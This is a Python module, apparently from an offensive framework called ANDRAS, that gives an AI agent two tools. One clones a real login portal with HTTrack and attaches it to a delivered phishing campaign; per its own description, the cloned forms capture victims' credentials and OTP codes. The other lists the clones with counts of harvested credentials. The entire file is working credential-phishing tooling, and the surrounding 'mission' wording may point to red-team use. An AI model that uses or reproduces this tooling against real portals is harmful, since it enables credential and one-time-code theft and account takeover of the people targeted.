"""El clonador a mano del agente: bajar un portal, engancharlo a una campaña y listarlo."""
from __future__ import annotations

from andras.agent import tools
from andras.artifacts import clone


@tools.tool("clone_portal", permission="write",
            description="Clona un portal de login con HTTrack y lo engancha a una campaña ya "
                        "entregada. Sus formularios pasan a ANDRAS: credenciales y OTP quedan "
                        "capturados. Tarda; usa timeout alto.",
            schema={"type": "object",
                    "properties": {"url": {"type": "string"},
                                   "campaign_id": {"type": "string"},
                                   "label": {"type": "string"},
                                   "timeout": {"type": "integer"}},
                    "required": ["url", "campaign_id"]})
def clone_portal(ctx, url: str, campaign_id: str, label: str = "",
                 timeout: int = 180) -> dict:
    if not ctx.conn.execute("SELECT 1 FROM campaigns WHERE id=?", (campaign_id,)).fetchone():
        raise tools.ToolError(f"campaña inexistente: {campaign_id}")
    try:
        clone_id = clone.create(ctx.conn, ctx.mission.id, url, label=label,
                                timeout=max(30, min(600, timeout)))
        entry = clone.attach(ctx.conn, campaign_id, clone_id)
    except clone.CloneError as exc:
        raise tools.ToolError(str(exc)) from exc
    return {"text": f"clon {clone_id} enganchado a la campaña; entrada {entry}",
            "data": {"clone_id": clone_id, "entry": entry}}


@tools.tool("clone_list", permission="read",
            description="Lista los clones de la misión con su URL original y el número de "
                        "credenciales capturadas por sus campañas.",
            schema={"type": "object", "properties": {}})
def clone_list(ctx) -> dict:
    rows = ctx.conn.execute(
        "SELECT c.id, c.label, c.url, c.created_at,"
        " (SELECT COUNT(*) FROM credentials k JOIN campaigns p ON p.id=k.campaign_id"
        "  WHERE p.clone_id=c.id) AS captured"
        " FROM clones c WHERE c.mission_id=? ORDER BY c.created_at DESC",
        (ctx.mission.id,)).fetchall()
    if not rows:
        return {"text": "sin clones en esta misión", "data": {"clones": []}}
    body = "\n".join(f"- {r['id']} · {r['url']} · {r['captured']} capturas · {r['created_at']}"
                     for r in rows)
    return {"text": body, "data": {"clones": [r["id"] for r in rows]}}
